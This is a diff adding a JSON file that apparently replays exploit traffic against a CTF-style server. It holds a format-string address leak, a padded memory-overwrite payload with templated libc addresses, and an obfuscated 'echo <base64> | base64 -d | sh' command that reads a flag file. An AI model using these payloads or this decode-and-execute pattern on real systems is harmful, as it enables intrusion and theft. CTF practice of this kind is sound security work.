@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1{{{HEAP_BASE:87415:3:ORI:0:0x6c6577}}}come!AAAAAAAA0x{{{STACK_BASE:-13872:12:HEX:18:0x7ffc530849d0}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7fe155f75780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7fe155ca62c0}}}:0x7fe15619c700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7fe155ca0147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-Type: text/h{{{HEAP_BASE:89460:3:ORI:44:0x6c6d74}}}; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9mY{{{HEAP_BASE:91223:3:ORI:23:0x6c7457}}}LWNnaS9mbGFnIHxiY{{{HEAP_BASE:81496:3:ORI:43:0x6c4e58}}}NjQK\" |base64 -d |sh\\n"
+]
